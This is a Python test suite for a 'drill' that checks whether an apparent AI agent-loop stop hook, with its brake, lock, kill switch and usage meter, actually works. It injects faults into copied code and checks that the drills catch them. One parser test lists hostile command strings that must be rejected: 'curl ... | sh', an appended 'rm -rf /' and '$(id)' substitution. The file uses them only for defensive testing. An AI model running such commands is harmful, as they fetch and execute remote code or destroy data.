#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""`loop-ctl drill` (ADR-021): a drill that cannot fail is theatre.

The point of a drill is that it FAILS when the thing it guards is broken. So most
of this file does not test the drill on a healthy hook — it breaks a COPY of the
tree, one fault at a time, and requires the right drill to go red (and, where the
fault is specific, only that one). A drill that passed every one of these would be
the same kind of control the project has paid for before: present, and silent.

The copies run in parallel in `setUpClass`; each drill run is a handful of
subprocesses, and 12 of them in sequence would double the suite.
"""

import concurrent.futures
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(RAIZ, "skill", "loop", "lib"))

import drill   # noqa: E402

CTL = os.path.join(RAIZ, "skill", "loop", "loop_ctl.py")
HOOK_REAL = os.path.join(RAIZ, "skill", "loop", "hooks", "loop-stop.py")

# name -> (file inside skill/loop, [(old, new), ...])
FALHAS = {
    "freio-morto": ("hooks/loop-stop.py", [
        ('if impressao == st.get("ultima_impressao") else 0)',
         'if False else 0)')]),
    "freio-sempre": ("hooks/loop-stop.py", [
        ('if impressao == st.get("ultima_impressao") else 0)',
         'if True else 0)')]),
    "freio-motivo-errado": ("hooks/loop-stop.py", [
        ('    decisao = "encerrou: %s" % motivo if motivo else "continuou"\n',
         '    motivo = "teto de iterações" if motivo == "sem progresso" else motivo\n'
         '    decisao = "encerrou: %s" % motivo if motivo else "continuou"\n')]),
    "trava-morta": ("hooks/loop-stop.py", [
        ("    if paradas >= maximo:\n", "    if False:\n")]),
    "trava-sempre": ("hooks/loop-stop.py", [
        ("    if paradas >= maximo:\n", "    if paradas >= 1:\n")]),
    "kill-switch-ignorado": ("lib/estado.py", [
        ('        return os.path.exists(self.p("STOP"))', "        return False")]),
    "medidor-desligado": ("hooks/loop-stop.py", [
        ('    uso_turno = atualizar_uso(st, payload.get("transcript_path"))\n',
         "    uso_turno = None\n")]),
    "medidor-sem-dedupe": ("lib/uso.py", [
        ("            if chave in vistos or chave in locais:\n                continue\n",
         "            pass\n")]),
    "fail-open-quebrado": ("hooks/loop-stop.py", [
        ("    except Exception:                                    # noqa: BLE001\n",
         "    except ZeroDivisionError:                            # noqa: BLE001\n")],
        ("lib/estado.py", [
            ("        except (IOError, OSError, ValueError):\n            return None\n        if not isinstance(st, dict):",
             "        except (IOError, OSError):\n            return None\n        if not isinstance(st, dict):")])),
    "cria-loop-sozinho": ("hooks/loop-stop.py", [
        ("    if not raiz:\n        sys.exit(0)\n",
         "    if not raiz:\n        os.makedirs(os.path.join(payload.get('cwd') or os.getcwd(), '.loop'), exist_ok=True)\n        sys.exit(0)\n")]),
    "nao-continua": ("hooks/loop-stop.py", [
        ('    _responder("block", reason=_preencher(gabarito, campos))',
         '    _responder("allow")')]),
    "hook-com-erro-de-sintaxe": ("hooks/loop-stop.py", [
        ("def principal():", "def principal(:")]),
    "reason-sem-o-item": ("hooks/loop-stop.py", [
        ('        "item": item or "(fila vazia)",', '        "item": "(fila vazia)",')]),
    "ctl-quebrado": ("loop_ctl.py", [
        ("def main(argv=None):", "def main(argv=None:")]),
}

# What each fault must turn red. `==` where the fault is specific, `>=` where it
# necessarily drags a neighbour with it.
ESPERADO = {
    "freio-morto": ({"freio-dispara"}, "=="),
    "freio-sempre": ({"freio-calado"}, "=="),
    "freio-motivo-errado": ({"freio-dispara"}, "=="),
    "trava-morta": ({"trava-dispara"}, "=="),
    "trava-sempre": ({"trava-dispara", "trava-calada"}, ">="),
    "kill-switch-ignorado": ({"kill-switch"}, "=="),
    "medidor-desligado": ({"medidor", "medidor-sem-duplicar"}, "=="),
    "medidor-sem-dedupe": ({"medidor-sem-duplicar"}, "=="),
    "fail-open-quebrado": ({"fail-open-estado"}, "=="),
    "cria-loop-sozinho": ({"inerte-fora-do-loop"}, "=="),
    "nao-continua": ({"continua-a-rodada"}, ">="),
    "hook-com-erro-de-sintaxe": ({"continua-a-rodada"}, ">="),
    "reason-sem-o-item": ({"continua-a-rodada"}, "=="),
    "ctl-quebrado": ({"continua-a-rodada", "freio-dispara", "trava-dispara"}, ">="),
}


def copiar_arvore(destino):
    """A copy of the tree the hook lives in: `skill/loop` plus `prompts/`."""
    shutil.copytree(os.path.join(RAIZ, "skill", "loop"),
                    os.path.join(destino, "skill", "loop"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    shutil.copytree(os.path.join(RAIZ, "prompts"), os.path.join(destino, "prompts"))
    return os.path.join(destino, "skill", "loop", "hooks", "loop-stop.py")


def quebrar(destino, falha):
    """Apply one named fault to a copy. Returns the copy's hook path."""
    hook = copiar_arvore(destino)
    partes = FALHAS[falha]
    pares = [partes[:2]] + ([partes[2]] if len(partes) > 2 else [])
    for arquivo, trocas in pares:
        caminho = os.path.join(destino, "skill", "loop", arquivo)
        with open(caminho, encoding="utf-8") as f:
            conteudo = f.read()
        for antigo, novo in trocas:
            assert conteudo.count(antigo) == 1, (falha, arquivo, antigo[:60])
            conteudo = conteudo.replace(antigo, novo, 1)
        with open(caminho, "w", encoding="utf-8") as f:
            f.write(conteudo)
    return hook


def reprovados(resultados):
    return {r.id for r in resultados if r.modo == "falhou"}


class TestDrillPegaAFalha(unittest.TestCase):
    """Every injected fault turns the right drill red — and no healthy drill does."""

    @classmethod
    def setUpClass(cls):
        cls.base = tempfile.mkdtemp(prefix="loop-drill-test-")

        def correr(nome):
            destino = os.path.join(cls.base, nome)
            hook = quebrar(destino, nome)
            return nome, drill.rodar("python3", hook)

        saudavel = os.path.join(cls.base, "saudavel")
        hook_ok = copiar_arvore(saudavel)
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as pool:
            futuro_ok = pool.submit(drill.rodar, "python3", hook_ok)
            cls.resultados = dict(pool.map(correr, FALHAS))
            cls.saudavel = futuro_ok.result()

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.base, ignore_errors=True)

    def test_a_copia_saudavel_passa_em_tudo(self):
        self.assertEqual(reprovados(self.saudavel), set(),
                         [(r.id, r.detalhe) for r in self.saudavel if r.modo != "passou"])
        self.assertEqual(len(self.saudavel), len(drill.DRILLS))
        self.assertEqual(drill.codigo_de_saida(self.saudavel), 0)

    def test_cada_falha_injetada_reprova_o_drill_certo(self):
        for nome, (esperados, modo) in ESPERADO.items():
            with self.subTest(falha=nome):
                reais = reprovados(self.resultados[nome])
                if modo == "==":
                    self.assertEqual(reais, esperados,
                                     "%s: %s" % (nome, [(r.id, r.detalhe) for r in self.resultados[nome] if r.modo == "falhou"]))
                else:
                    self.assertTrue(esperados <= reais, "%s: reprovou só %s" % (nome, reais))
                self.assertEqual(drill.codigo_de_saida(self.resultados[nome]), 2)

    def test_freio_com_motivo_errado_nao_conta_como_freio(self):
        # The brake drill is credited only for the rule under test: the round DID
        # end, by the wrong reason, and the detail has to say which.
        r = next(x for x in self.resultados["freio-motivo-errado"]
                 if x.id == "freio-dispara")
        self.assertEqual(r.modo, "falhou")
        self.assertIn("teto de iterações", r.detalhe)

    def test_loop_ctl_quebrado_aparece_como_falha_do_armar(self):
        # The scenario could not even be set up. That is a failure of the
        # installation and has to say so, not surface as an unrelated assertion.
        r = next(x for x in self.resultados["ctl-quebrado"]
                 if x.id == "continua-a-rodada")
        self.assertEqual(r.modo, "falhou")
        self.assertIn("`loop-ctl armar` falhou", r.detalhe)

    def test_hook_que_nem_compila_reprova_sem_levantar(self):
        self.assertTrue(len(reprovados(self.resultados["hook-com-erro-de-sintaxe"])) >= 1)

    def test_hook_morto_nao_acumula_verdes_nos_drills_de_nao_disparar(self):
        # A hook that never runs also "passes" the drills that say "it must not
        # fire": it never brakes, never locks. Measured on a hook with a syntax
        # error — before the pairing both showed a green tick next to their dead
        # partner. They are skips now.
        por_id = {r.id: r for r in self.resultados["hook-com-erro-de-sintaxe"]}
        for calado in ("freio-calado", "trava-calada"):
            with self.subTest(drill=calado):
                self.assertEqual(por_id[calado].modo, "pulou")
                self.assertIn("sem valor", por_id[calado].detalhe)

    def test_drill_que_afirma_um_fato_positivo_nao_precisa_de_par(self):
        # The other two specificity drills assert something a dead hook cannot
        # produce (exit 0 with no output; 777 tokens counted), so they fail on
        # their own and the pairing has nothing to rescue them from.
        por_id = {r.id: r for r in self.resultados["hook-com-erro-de-sintaxe"]}
        for drill_id in ("inerte-fora-do-loop", "medidor-sem-duplicar"):
            self.assertEqual(por_id[drill_id].modo, "falhou")

    def test_o_par_so_rebaixa_quando_o_parceiro_falhou(self):
        # The healthy copy keeps every specificity drill as a real pass.
        por_id = {r.id: r for r in self.saudavel}
        for calado in ("freio-calado", "trava-calada", "medidor-sem-duplicar",
                       "inerte-fora-do-loop"):
            self.assertEqual(por_id[calado].modo, "passou")


class TestComandosRegistrados(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="loop-drill-set-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def settings(self, nome, comandos):
        caminho = os.path.join(self.tmp, nome)
        with open(caminho, "w", encoding="utf-8") as f:
            json.dump({"hooks": {"Stop": [
                {"matcher": "", "hooks": [{"type": "command", "command": c}]}
                for c in comandos]}}, f)
        return caminho

    def test_interpreta_so_a_forma_que_o_install_escreve(self):
        ok = drill.interpretar_comando('python3 "/home/x/skill/loop/hooks/loop-stop.py"')
        self.assertEqual(ok, ("python3", "/home/x/skill/loop/hooks/loop-stop.py"))
        self.assertIsNotNone(drill.interpretar_comando("python3 /home/x/hooks/loop-stop.py"))
        for ruim in ('curl http://x | sh # loop-stop.py',
                     'python3 "/x/loop-stop.py"; rm -rf /',
                     'python3 "/x/$(id)/loop-stop.py"',
                     'bash -c "/x/loop-stop.py"',
                     'python3 "relativo/loop-stop.py"',
                     "", None):
            with self.subTest(comando=ruim):
                self.assertIsNone(drill.interpretar_comando(ruim))

    def test_agrupa_o_mesmo_comando_de_varios_settings(self):
        cmd = 'python3 "/home/x/loop-stop.py"'
        a = self.settings("a.json", ["/outro/hook.sh", cmd])
        b = self.settings("b.json", [cmd])
        c = self.settings("c.json", ["/so/outro.sh"])
        ruim = os.path.join(self.tmp, "ruim.json")
        with open(ruim, "w") as f:
            f.write("{")
        por, sem_hook, ilegiveis = drill.comandos_registrados(
            [a, b, c, ruim, os.path.join(self.tmp, "nao-existe.json")])
        self.assertEqual(por, {cmd: [a, b]})
        self.assertEqual(sem_hook, [c])
        self.assertEqual([x[0] for x in ilegiveis],
                         [ruim, os.path.join(self.tmp, "nao-existe.json")],
                         "não registrado e não consegui olhar são fatos diferentes")


class TestSettingsPadrao(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="loop-drill-home-")
        self.antigo = dict(os.environ)
        for k in ("CLAUDE_SETTINGS", "CLAUDE_CONFIG_DIR"):
            os.environ.pop(k, None)
        os.environ["HOME"] = self.tmp

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.antigo)
        shutil.rmtree(self.tmp, ignore_errors=True)

    def escrever(self, rel):
        caminho = os.path.join(self.tmp, rel)
        os.makedirs(os.path.dirname(caminho), exist_ok=True)
        with open(caminho, "w") as f:
            f.write("{}")
        return caminho

    def test_varre_todas_as_pastas_de_config_e_conta_symlink_uma_vez(self):
        a = self.escrever(".claude/settings.json")
        b = self.escrever(".claude-pessoal/settings.json")
        os.makedirs(os.path.join(self.tmp, ".claude-espelho"))
        os.symlink(b, os.path.join(self.tmp, ".claude-espelho", "settings.json"))
        achados = drill.settings_padrao()
        self.assertEqual(sorted(os.path.realpath(x) for x in achados),
                         sorted([os.path.realpath(a), os.path.realpath(b)]))
        self.assertEqual(len(achados), 2, "o symlink aponta para o mesmo arquivo")

    def test_claude_settings_manda_sozinho(self):
        self.escrever(".claude/settings.json")
        os.environ["CLAUDE_SETTINGS"] = "/tmp/de-teste.json"
        self.assertEqual(drill.settings_padrao(), ["/tmp/de-teste.json"])


class TestInstall(unittest.TestCase):
    """`install.sh` fires the hook it just registered — or the line proves nothing."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="loop-drill-inst-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def instalar(self, arvore, **extra_env):
        shutil.copy(os.path.join(RAIZ, "install.sh"), os.path.join(arvore, "install.sh"))
        env = dict(os.environ, CLAUDE_SETTINGS=os.path.join(self.tmp, "s", "settings.json"),
                   CLAUDE_SKILLS_DIR=os.path.join(self.tmp, "skills"),
                   LOOP_BIN_DIR=os.path.join(self.tmp, "bin"))
        env.pop("LOOP_SEM_DRILL", None)
        env.update(extra_env)
        return subprocess.run(["bash", os.path.join(arvore, "install.sh")],
                              capture_output=True, text=True, timeout=120, env=env)

    def test_instalacao_saudavel_dispara_o_drill_e_termina_bem(self):
        arvore = os.path.join(self.tmp, "ok")
        copiar_arvore(arvore)
        proc = self.instalar(arvore)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn("%d passaram · 0 falharam" % len(drill.DRILLS), proc.stdout)

    def test_hook_registrado_que_nao_age_falha_a_instalacao(self):
        arvore = os.path.join(self.tmp, "ruim")
        quebrar(arvore, "freio-morto")
        proc = self.instalar(arvore)
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("NÃO faz o que promete", proc.stderr)
        self.assertNotIn("Pronto.", proc.stdout, "não pode anunciar sucesso")

    def test_loop_sem_drill_pula_o_passo(self):
        arvore = os.path.join(self.tmp, "pula")
        quebrar(arvore, "freio-morto")           # would fail, if the drill ran
        proc = self.instalar(arvore, LOOP_SEM_DRILL="1")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertNotIn("passaram", proc.stdout)


class TestCli(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="loop-drill-cli-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def ctl(self, *args):
        return subprocess.run([sys.executable, CTL, "drill"] + list(args),
                              capture_output=True, text=True, timeout=120)

    def test_hook_saudavel_sai_0_e_json_estruturado(self):
        proc = self.ctl("--hook", HOOK_REAL, "--json")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        dados = json.loads(proc.stdout)
        self.assertEqual(dados["codigo"], 0)
        self.assertEqual(len(dados["comandos"][0]["resultados"]), len(drill.DRILLS))
        self.assertTrue(all(r["modo"] == "passou"
                            for r in dados["comandos"][0]["resultados"]))

    def test_hook_quebrado_sai_2_e_diz_o_que_protege(self):
        hook = quebrar(os.path.join(self.tmp, "c"), "freio-morto")
        proc = self.ctl("--hook", hook)
        self.assertEqual(proc.returncode, 2)
        self.assertIn("✘ freio-dispara", proc.stdout)
        self.assertIn("o que isto protege: o freio que nunca dispara (0.4.3)", proc.stdout)

    def test_sem_hook_registrado_sai_1_e_manda_instalar(self):
        vazio = os.path.join(self.tmp, "settings.json")
        with open(vazio, "w") as f:
            json.dump({"hooks": {}}, f)
        proc = self.ctl("--settings", vazio)
        self.assertEqual(proc.returncode, 1)
        self.assertIn("nenhum hook do loop registrado", proc.stdout)
        self.assertIn("./install.sh", proc.stdout)

    def test_comando_de_outra_forma_nao_e_executado(self):
        # The line only MENTIONS the hook. If the drill ran it, the marker would exist.
        marca = os.path.join(self.tmp, "executou")
        settings = os.path.join(self.tmp, "s.json")
        with open(settings, "w") as f:
            json.dump({"hooks": {"Stop": [{"hooks": [{
                "type": "command",
                "command": "touch %s; echo loop-stop.py" % marca}]}]}}, f)
        proc = self.ctl("--settings", settings)
        self.assertFalse(os.path.exists(marca), "o drill executou um comando que não conhece")
        self.assertEqual(proc.returncode, 1)
        self.assertIn("não executo", proc.stdout)

    def test_hook_apontando_para_nada_reprova(self):
        settings = os.path.join(self.tmp, "s.json")
        with open(settings, "w") as f:
            json.dump({"hooks": {"Stop": [{"hooks": [{
                "type": "command",
                "command": 'python3 "%s/some/where/loop-stop.py"' % self.tmp}]}]}}, f)
        proc = self.ctl("--settings", settings)
        self.assertEqual(proc.returncode, 2)
        self.assertIn("hook-existe", proc.stdout)

    def test_nao_escreve_no_settings(self):
        settings = os.path.join(self.tmp, "s.json")
        with open(settings, "w") as f:
            json.dump({"hooks": {"Stop": [{"hooks": [{
                "type": "command", "command": 'python3 "%s"' % HOOK_REAL}]}]}}, f)
        with open(settings, "rb") as f:
            antes = f.read()
        proc = self.ctl("--settings", settings)
        self.assertEqual(proc.returncode, 0, proc.stdout)
        with open(settings, "rb") as f:
            self.assertEqual(f.read(), antes)


class TestIsolamento(unittest.TestCase):
    def test_o_drill_trabalha_num_mundo_proprio_e_limpa_depois(self):
        base = tempfile.mkdtemp(prefix="loop-drill-iso-")
        antigo = tempfile.tempdir
        tempfile.tempdir = base
        try:
            drill.rodar("python3", HOOK_REAL)
            sobras = os.listdir(base)
        finally:
            tempfile.tempdir = antigo
            shutil.rmtree(base, ignore_errors=True)
        self.assertEqual(sobras, [], "o drill deixou rastro no diretório temporário")

    def test_home_dos_subprocessos_e_o_mundo_do_drill(self):
        # A subprocess with the real HOME could read or write ~/.claude*, git's
        # global config, the memory hooks. It must not.
        base = tempfile.mkdtemp(prefix="loop-drill-home-")
        try:
            amb = drill.Ambiente("python3", HOOK_REAL, base)
            self.assertEqual(amb.env["HOME"], base)
            self.assertNotEqual(amb.env["HOME"], os.path.expanduser("~"))
        finally:
            shutil.rmtree(base, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
